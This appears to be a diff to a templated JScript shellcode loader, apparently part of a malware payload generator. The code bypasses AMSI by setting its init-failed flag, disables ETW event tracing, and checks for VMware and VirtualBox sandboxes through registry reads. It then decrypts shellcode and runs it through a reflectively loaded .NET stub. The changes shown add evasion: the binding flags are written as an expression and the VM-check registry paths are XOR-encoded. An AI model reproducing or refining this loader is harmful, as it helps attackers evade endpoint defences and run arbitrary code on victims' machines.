@@ -10,7 +10,7 @@ function {{ v.fn_amsi }}() {
         var asm  = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
         var amsi = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
         if (amsi !== null) {
-            amsi.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), 36).SetValue(null, true);
+            amsi.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), (4|32)).SetValue(null, true);
         }
     } catch(e) {}
 }
@@ -20,7 +20,7 @@ function {{ v.fn_etw }}() {
         var asm = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
         var t = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
         if (t !== null) {
-            var fi = t.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), 36);
+            var fi = t.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), (4|32));
             if (fi !== null) fi.SetValue(null, 0);
         }
     } catch(e) {}
@@ -41,15 +41,19 @@ function {{ v.fn_sandbox }}() {
             if (d.ScreenWidth && d.ScreenWidth < 800) return true;
         }
     } catch(e2) {}
-    // VM registry key checks
+    // VM registry key checks (XOR-encoded per build)
     try {
         var sh = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
-        sh.RegRead({{ v.fn_build_str }}([72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104]));
+        var _vmr=[{{ jsc_vmware_reg_enc }}],_vmx={{ jsc_vmware_reg_xk }};
+        for(var _ri=0;_ri<_vmr.length;_ri++)_vmr[_ri]^=_vmx;
+        sh.RegRead({{ v.fn_build_str }}(_vmr));
         return true;
     } catch(e) {}
     try {
         var sh2 = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
-        sh2.RegRead({{ v.fn_build_str }}([72,75,76,77,92,83,79,70,84,87,65,82,69,92,79,114,97,99,108,101,92,86,105,114,116,117,97,108,66,111,120,32,71,117,101,115,116,32,65,100,100,105,116,105,111,110,115,92,86,101,114,115,105,111,110]));
+        var _vbr=[{{ jsc_vbox_reg_enc }}],_vbx={{ jsc_vbox_reg_xk }};
+        for(var _ri2=0;_ri2<_vbr.length;_ri2++)_vbr[_ri2]^=_vbx;
+        sh2.RegRead({{ v.fn_build_str }}(_vbr));
         return true;
     } catch(e) {}
     try {
@@ -118,7 +122,7 @@ function {{ v.fn_exec }}() {
     for (var _ki = 0; _ki < _k.length; _ki++) _k[_ki] ^= {{ key_tweak }};
     var sc  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), _k);
     var loader = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-    var stub   = {{ v.fn_hex2arr }}("{{ v.dotnet_stub_hex }}");
+    var stub   = {{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}");
     var asm    = loader.Load(stub);
     var t      = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}]));
     var mi     = t.GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}]));
